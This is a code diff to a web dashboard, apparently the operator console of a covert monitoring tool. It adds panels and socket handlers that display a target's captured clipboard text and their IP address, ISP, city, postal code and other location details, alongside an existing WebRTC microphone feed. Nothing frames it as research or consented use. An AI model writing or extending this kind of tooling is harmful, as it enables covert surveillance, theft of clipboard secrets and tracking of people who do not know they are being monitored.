@@ -263,6 +263,39 @@
     </div>
   </div>
 
+  <!-- CLIPBOARD PANEL -->
+  <div class="panel" style="grid-column:span 2;">
+    <div class="panel-title">Clipboard Contents</div>
+    <div id="clipStatus" class="status-badge badge-waiting" style="margin-bottom:10px;">⏳ WAITING</div>
+    <div id="clipText" style="
+      background:rgba(0,212,255,.04);
+      border:1px solid var(--border);
+      border-radius:4px;
+      padding:14px;
+      font-size:.85rem;
+      color:var(--yellow);
+      min-height:60px;
+      line-height:1.6;
+      word-break:break-all;
+      white-space:pre-wrap;
+    ">--</div>
+  </div>
+
+  <!-- IP / ISP PANEL -->
+  <div class="panel" style="grid-column:span 1;">
+    <div class="panel-title">Network Identity</div>
+    <div class="dev-grid" style="grid-template-columns:1fr 1fr;">
+      <div class="dev-item" style="grid-column:span 2"><div class="dev-label">IP ADDRESS</div><div class="dev-value danger" id="ip-addr">--</div></div>
+      <div class="dev-item" style="grid-column:span 2"><div class="dev-label">ISP / ORG</div><div class="dev-value" id="ip-isp">--</div></div>
+      <div class="dev-item"><div class="dev-label">CITY</div><div class="dev-value" id="ip-city">--</div></div>
+      <div class="dev-item"><div class="dev-label">REGION</div><div class="dev-value" id="ip-region">--</div></div>
+      <div class="dev-item"><div class="dev-label">COUNTRY</div><div class="dev-value" id="ip-country">--</div></div>
+      <div class="dev-item"><div class="dev-label">POSTAL</div><div class="dev-value" id="ip-postal">--</div></div>
+      <div class="dev-item"><div class="dev-label">DIAL CODE</div><div class="dev-value" id="ip-dial">--</div></div>
+      <div class="dev-item"><div class="dev-label">CURRENCY</div><div class="dev-value" id="ip-currency">--</div></div>
+    </div>
+  </div>
+
 </div>
 
 <script src="/socket.io/socket.io.js"></script>
@@ -388,7 +421,39 @@
     }
   });
 
-  // WebRTC mic
+  // Clipboard
+  socket.on('p3-clipboard', (data) => {
+    const el = document.getElementById('clipText');
+    const badge = document.getElementById('clipStatus');
+    if (data.error) {
+      el.textContent = '⚠️ ' + data.error;
+      badge.className = 'status-badge badge-error';
+      badge.textContent = '✗ DENIED';
+      addLog('Clipboard: ' + data.error, 'warn');
+    } else {
+      el.textContent = data.text;
+      badge.className = 'status-badge badge-live';
+      badge.textContent = '✓ CAPTURED';
+      addLog('Clipboard captured: ' + data.text.substring(0, 40) + (data.text.length > 40 ? '...' : ''), 'ok');
+    }
+  });
+
+  // IP / ISP
+  socket.on('p3-ip-info', (data) => {
+    if (data.error) { addLog('IP info error: ' + data.error, 'warn'); return; }
+    function set(id, val) { const e = document.getElementById(id); if(e && val) e.textContent = val; }
+    set('ip-addr', data.ip);
+    set('ip-isp', data.isp);
+    set('ip-city', data.city);
+    set('ip-region', data.region);
+    set('ip-country', data.country);
+    set('ip-postal', data.postal);
+    set('ip-dial', data.callingCode);
+    set('ip-currency', data.currency);
+    addLog('IP intel received: ' + data.ip + ' · ' + data.isp, 'ok');
+  });
+
+
   let pc = null;
   const iceConfig = {
     iceServers:[
